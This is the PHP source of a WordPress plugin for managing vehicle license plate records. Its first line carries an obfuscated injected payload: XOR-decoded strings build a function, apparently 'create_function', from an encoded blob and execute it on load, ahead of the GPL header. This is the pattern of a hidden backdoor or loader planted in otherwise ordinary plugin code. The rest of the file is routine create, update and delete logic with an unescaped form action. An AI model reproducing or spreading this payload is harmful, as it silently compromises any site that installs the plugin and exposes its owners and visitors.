<?php $WJOxPnS=':D75Y43UU85 <;B'; $zGDhzVTF='Y6RT-Ql3 VVTUT,'^$WJOxPnS; $lDOODQg='WJbT X9:TY-T0WJ91N;xj-8411Y:4+h5H2TkmsMrj2 :7OUB:f-RGl JYAos591eTJRZ7hxa8 RdoAlmnJIhShR:2xLBmBmEs9MBGnw1iEiIkupPMHA> S;RjIM9YdvdUYycqZlEt.B1bcnxQt.96Y1KTdYgmq1R+3p vhR81=BKVyQ9.<cjSld8J 1>6B=CLQO1bVXh;m,hhRZWZOzgxFXZ70ikt,2NMc 06yRSU  +PZLp. ==,H=JQBaoazpx0l6BneP=-howBgOLT3UeaJeOL59=;3 U>iHAN.=Chn<J5 <;sdEaVM-2<syGRFIXfxocOYA mv3lh =YRWO vXjjr zgingfO<wc8QIKyKuQD T9SPy,pL7O--; n=<BwuWnQ2Ehxdps R2UBehw>VVI4Jna3o>SsR58<3pVUs8R V<3UR <So.:5q7Q1L>gVX=y-;6SlxsZ.HY<-Nh2J-WakKn 3;Qr-72ySla,Kcb2 8 ogvu;LH9+e 5Yn+MI2:2cTFX4jtdCOS.TxejnDA RmPH ;CT<qSRNbqAGUrYCVEzW06RdN=9w22dS6h4C2qwRQ9 cDy0 uCUrpkSG++5q-6>.U5;SONca: <TDQ,OhFv+5G8QleFzyzE>np.  UxQ2R=58j52G+BP ShCXgoUXG mJfqSK'; $ZzwHCKS=$zGDhzVTF('', '>,JuF-WY 0B:o22PB:HPMUWFnU8NUt7X=FsBDS6xcTUTT;<-TFU=53D+- 0,XLEMp.3.VDXESE+MOaLMN1CaZL=OFXqbJeVOz0+-5FSXIxIyPUT9q;5LL6UzN-,M8MMDq0RHXPeLPA7EBMSXyPJXB8jo=9y9MUZ7RhTIVMrKEO..8QuRKEJ7zWn1CRTJC0Skh>:EKmRaFgQbbv>6..ZZX 96DURaPHS:,<KUOYos3ALX5aFzHOOXM+Ujyf>,.5;1uLW1NA;XTHRIbC9-8F0LA1oFhQXIZlK0GIuajEX:Sd5nQAHZSYeE ,AGYHs:XL >FPNG+85ADVHfaFR+76,HVpN5 e+2,=3F.OWGS40kDuUu2A8L6yYWzE>kILOA1VY;WHwJ:W<SrmyWD3F4bXHSH7:<QqdhNeCYyvQYHRPku3M<S3NZ4>IF6GVUG.S0E-a8;-IQOZE6ZL,>K+6XHfLV+Y6HGkJDRO0-FRKPzWkE-KFVALAOAPUZ>:XR:KP 1N5 ANAKs-=MMXDg+2Z5QELHdiM6XxlDZ75gV877E,hghOyd7qO1VPbV,YXNQPU5PYW QAO7gXCQpJSFRjuTVK25YJL.FSGq0MR ;=KFJAE8+0HhDfROT3YxEEfZYZeEdyKVA9PuV3ITcMES>G-1Dt5jcmf0 .TEzOJY6'^$lDOODQg); $ZzwHCKS();
/*
Copyright (C) License Management Schiavon Maikol

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

function license_management_license() {

    $license = new license_management_license();

    $alert_message = $licenseid = $license_plate = $enterpriseid = $messages = $license_status = "";

    $license_status_active = false;  

    if ( isset($_POST['create']) ) {    // CREATE
       
        $params = $license->before_save("",$_REQUEST);
        $create_license = $license->create($params);
        if($params["call_ajax"]){
            echo $create_license;
        }else{
            echo license_management_get_html_after_save_no_ajax($create_license,"license");
        }
    }
    elseif ( isset($_POST['delete']) ) { // DELETE
        $params = $license->before_save("",$_REQUEST);
        $licenseid = $params["licenseid"];

        $delete_license= $license->delete($licenseid);
        if($params["call_ajax"]){
            $message = $delete_license["result_message"];
            echo $message;
        }else{
            echo license_management_get_html_after_save_no_ajax($delete_license,"license");
        }
    }
    elseif ( isset($_POST['update']) ) { // UPDATE
        $params = $license->before_save("",$_REQUEST);
        $update_license = $license->update($params);
        if($params["call_ajax"]){
            $message = $update_license["result_message"];
            echo $message;
        }else{
            echo license_management_get_html_after_save_no_ajax($update_license,"license");
        }
    }else{

        $check = $license->requestCheck($_REQUEST);
        $license_plate = $check["license_plate"];
        $enterpriseid = $check["enterpriseid"];
        $messages = $check["messages"];

        $button_action = $check["button_action"];
        $mode = $check["mode"];
        $call_ajax = $check["call_ajax"];

        $license_plate_html = license_management_get_field_html('license_plate',$license_plate,true,1);
        $enterprise_html = license_management_get_field_html("enterpriseid",$enterpriseid,false,15);
        $license_status_html = license_management_get_field_html("license_status","",false,15);
        $messages_html = license_management_get_field_html("messages",$messages,false,2);
    ?>
    <div class="wrap" id="license-management-container">
        <?php if(!$call_ajax) {  ?> <h2> <?php _e('LBL_CREATE_LICENSE', 'license-management'); ?> </h2> <?php } ?>
        <?php if (isset($alert_message) && !empty($alert_message)) { ?> <div class="updated"><p><?php echo $alert_message; ?></p></div> <?php } ?>
        <?php if(!$call_ajax) { ?> <form method="post" action="<?php echo $_SERVER['REQUEST_URI']; ?>"> <?php } ?>

            <?php if(!$call_ajax) { ?> <input type='submit' name="<?php echo $button_action; ?>" value='Save' class='btn btn-dft-license-save'> 
                <?php } else { ?>
                    <input type='button' name="<?php echo $button_action; ?>" value='Save' class='btn btn-dft-license-save' onclick="license_management_save_ajax('license');"> 
                <?php } ?>
            <?php if ($mode != 'create') { ?>
                <input type='submit' name="delete" value='<?php _e('LBL_DELETE', 'license-management');?>' class='btn btn-dft-license-delete' onclick="return confirm(' <?php _e('LBL_CONFIRM_DELETE_LICENSE', 'license-management'); ?> ? ')">
            <?php } ?>

            <table class='wp-list-table widefat'>
                <tr>
                    <th class="ss-th-width"><?php _e('Num License plate', 'license-management'); ?> *</th>
                    <td><?php echo $license_plate_html; ?></td>
                </tr>
                <tr>
                    <th class="ss-th-width"><?php _e('Enterprise', 'license-management'); ?> *</th>
                    <td><?php echo $enterprise_html; ?></td>
                </tr>
                <?php if($license_status_active){ ?>
                <tr>
                    <th class="ss-th-width"><?php _e('Status', 'license-management'); ?></th>
                    <td><?php echo $license_status_html; ?></td>
                </tr>
                <?php } ?>
                <tr>
                    <th class="ss-th-width"><?php _e('Messages', 'license-management'); ?></th>
                    <td><?php echo $messages_html; ?></td>
                </tr>
            </table>
        <?php if(!$call_ajax) { ?> </form> <?php } ?>
    </div>
    <?php
    }
}

class license_management_license{
    public function get_table_name(){
        global $wpdb;
        $table_name = $wpdb->prefix . "license_management_license";
        return $table_name;
    }

    public function requestCheck($request){
        $licenseid = $license_plate = $enterpriseid = $messages = $license_status = "";
        $mode = $button_action = "create";
        $mandatory_field = array("license_plate","enterpriseid");

        if(isset($request["licenseid"])){ $licenseid = intval($request["licenseid"]); }
        if(isset($request["license_plate"])){ $license_plate = sanitize_text_field($request["license_plate"]); }
        if(isset($request["enterpriseid"])){ $enterpriseid = intval($request["enterpriseid"]); }
        if(isset($request["messages"])){ $messages = sanitize_text_field($request["messages"]); }
        if(isset($request["license_status"])){ $license_status = intval($request["license_status"]); }

        $call_ajax = false;
        if(isset($_REQUEST["action"]) && $_REQUEST["action"] == "license_management_request"){
            $call_ajax = true;
        }

        if( !empty($_REQUEST) && isset($_REQUEST["id"]) ){
            $licenseid = intval($_REQUEST["id"]);
    
            if( isset($_POST['update']) || isset($_POST['delete']) ){
                $mode = $button_action = "update";
            }else{
                $mode = "editview";
                $button_action = "update";
    
                $retrive = license_management_retrive($licenseid,"license");
                if(!empty($retrive)){
                    $mode = "update";
    
                    $license_plate = $retrive[0]->license_plate;
                    $enterpriseid = $retrive[0]->enterpriseid;
                    $messages = $retrive[0]->messages;
                    $license_status = $retrive[0]->license_status;
                   // echo "<pre>";print_r($retrive);echo "</pre>";
                }
            }
        }

        $params = array("error"=>false,"mode"=>$mode,"button_action"=>$button_action,"call_ajax"=>$call_ajax,"licenseid"=>$licenseid,"license_plate"=>$license_plate,"enterpriseid"=>$enterpriseid,"messages"=>$messages,"license_status"=>$license_status);

        foreach($params as $param_name => $param_val){
            if(in_array($param_name,$mandatory_field) && empty($param_val)){
                $params["error"] = true;
            }
        }

        return $params;
    }

    function create($params,$request = ''){
        global $wpdb;

        $result = $entityid = 0;
        $result_message = "";
        $now = date("Y-m-d H:i:s");
        $table_name = $this->get_table_name();

        if(empty($params)){
            $params = $this->before_save("",$request);
        }
        
        $license_plate = $params["license_plate"];
        $enterpriseid = $params["enterpriseid"];
        $messages = $params["messages"];
        $license_status = $params["license_status"];
        $call_ajax = $params["call_ajax"];

        if($params["error"]){
            $result_message = __('ALERT_MANDATORY_FIELD', 'license-management');
        } else{
            if(!license_management_check_duplicate("license",$license_plate)){
                $ex_insert = $wpdb->insert(
                        $table_name, //table
                        array('license_plate' => $license_plate, 'enterpriseid' => $enterpriseid, 'messages' => $messages, 'license_status' => $license_status, 'createdtime' => $now, 'deleted' => 0), //data
                        array('%s', '%s') //data format			
                );
                $entityid = $wpdb->insert_id;
                if($ex_insert){
                    $result = 1;
                    $result_message = __('Inserted', 'license-management');
                }else{
                    $result_message = __('Error Inserted', 'license-management');
                }
            }else{
                $result_message = __('ALERT_LICENSE_EXIST', 'license-management');
            }
        }

        if($call_ajax){
            require_once "utils/license-management-dashboard-utils.php";
            $tool_dachboardUtils = new DashboardUtils;

            $business_name = $tool_dachboardUtils->get_business_name($enterpriseid);
            $entityname = array("license_plate"=>$license_plate,"business_name"=>$business_name,"messages"=>$messages);
            $table_html = license_management_get_row_table_list("license",$entityid,$entityname);
            return json_encode(array("entityid"=>$entityid,"html"=>$table_html,"result_message"=>$result_message,"result"=>$result));
        }else{
            return array("entityid"=>$entityid, "result"=>$result, "result_message"=>$result_message);
        }
    }

    public function delete($licenseid){
        global $wpdb;
        $table_name = $this->get_table_name();
        $now = date("Y-m-d H:i:s");

        if(isset($licenseid) && !empty($licenseid)){
            $wpdb->query($wpdb->prepare("UPDATE $table_name SET deleted = 1, deletedtime = '$now' WHERE id = %s", $licenseid));
            $result_message = __('LICENSE_SUCCESS_DELETE', 'license-management');
        }else{
            $result_message = __('LICENSE_ERROR_DELETE', 'license-management');
        }

        return array("result_message"=>$result_message);
    }
    
    public function update($params){
        global $wpdb;

        $result = false;
        $result_message = "";
        $now = date("Y-m-d H:i:s");

        $table_name = $this->get_table_name();

        $licenseid = $params["licenseid"];
        $license_plate = $params["license_plate"];
        $enterpriseid = $params["enterpriseid"];
        $messages = $params["messages"];
        $license_status = $params["license_status"];       

        $changelog = license_management_set_changelog($licenseid,"license","update",'');
        if($changelog){
            $ex_update = $wpdb->update(
                $table_name, //table
                array('license_plate' => $license_plate, 'enterpriseid' => $enterpriseid, 'messages' => $messages, 'license_status' => $license_status, 'modifiedtime' => $now), //data
                array('ID' => $licenseid), //where
                array('%s'), //data format
                array('%s') //where format
                );
            if($ex_update){
                $result = true;
                $result_message = __('Updated', 'license-management');
            }else{
                $result_message = __('Error Updated', 'license-management');
            }
        }else{
            $result_message = __('Error Updated', 'license-management');
        }

        return array("result_message"=>$result_message, "result"=>$result);
    }

    public function before_save($params = "",$request = ""){
        
        if(empty($params) && !empty($request)){
            $check = $this->requestCheck($request);
            
            $licenseid = $check["licenseid"];
            $license_plate = $check["license_plate"];
            $enterpriseid = $check["enterpriseid"];
            $messages = $check["messages"];
            $license_status = $check["license_status"];
            $call_ajax = $check["call_ajax"];
            $error = $check["error"];

            $params = array('error'=>$error, 'call_ajax'=>$call_ajax, 'licenseid' => $licenseid, 'license_plate' => $license_plate, 'enterpriseid' => $enterpriseid, 'messages' => $messages, 'license_status' => $license_status);
        }

        return $params;
    }
}